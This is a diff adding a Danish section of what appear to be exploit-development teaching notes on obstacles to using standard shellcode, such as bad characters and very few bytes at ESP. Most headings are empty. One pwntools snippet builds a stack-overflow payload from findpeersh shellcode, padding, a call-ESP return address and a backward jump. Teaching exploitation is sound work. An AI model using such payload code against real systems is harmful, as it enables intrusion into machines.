@@ -1,0 +1,32 @@
+Udfordringer
+------------
+Nogen gange kan man ikke bare bruge en standard shellcode.
+
+Her følger et par eksempler på udfordinger.
+
+Udfordringer - Filtre (bad chars)
+---------------------------------
+
+Udfordringer - Krævede konstanter
+---------------------------------
+
+Udfordringer - Læste pointer
+----------------------------
+
+Udfordringer - Skrevne pointere
+-------------------------------
+
+Udfordringer - 'ESP' + meget få bytes
+-------------------------------------
+
+[source,python]
+------------------------------------------------
+SHELLCODE = asm(shellcraft.findpeersh())
+PAYLOAD = flat(SHELLCODE,
+               'A' * (RET_OFFSET - len(SHELLCODE)),
+                CALL_ESP)
+PAYLOAD += asm('jmp -%d' % len(PAYLOAD))
+------------------------------------------------
+
+Udfordringer - Printable
+------------------------
